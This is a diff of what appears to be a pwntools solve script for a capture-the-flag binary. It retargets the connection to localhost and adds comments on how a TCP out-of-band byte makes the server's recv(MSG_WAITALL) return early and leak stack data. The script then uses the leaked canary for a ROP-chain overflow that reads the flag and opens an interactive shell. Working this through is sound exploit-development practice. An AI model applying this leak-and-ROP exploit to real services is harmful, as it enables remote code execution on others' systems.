@@ -5,12 +5,21 @@ import socket
 exe = context.binary = ELF(args.EXE or './chall')
 libc = ELF(exe.libc.path)
 
-r = remote('192.168.130.129', 5000)
+r = remote('localhost', 31337)
 
 r.send(p64(0x1ff))
 r.send(b'A'*0x100)
 
-r.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+"""
+r.sock.shutdown(socket.SHUT_WR)
+	server's recv(MSG_WAITALL) sees EOF before
+	all n bytes arrive, so it stops waiting and returns early.
+
+r.sock.send(b"!", socket.MSG_OOB) 
+	next byte in the stream becomes “different type” data, which forces recv(MSG_WAITALL) to stop
+	reading normal bytes and return whatever it already collected.
+"""
+
 r.sock.send(b'!', socket.MSG_OOB)
 
 leaks         = r.recv(0x1ff)[0x100:]
@@ -61,4 +70,5 @@ r.send(b"A"*0x100 + p64(0) + p64(canary) + p64(0) + rop)
 r.send(p64(0x2000))
 r.clean()
 r.send(b"cat /flag-*.txt\x00")
-print(r.recvall(timeout=1).strip().decode())
+#print(r.recvall(timeout=1).strip().decode())
+r.interactive()
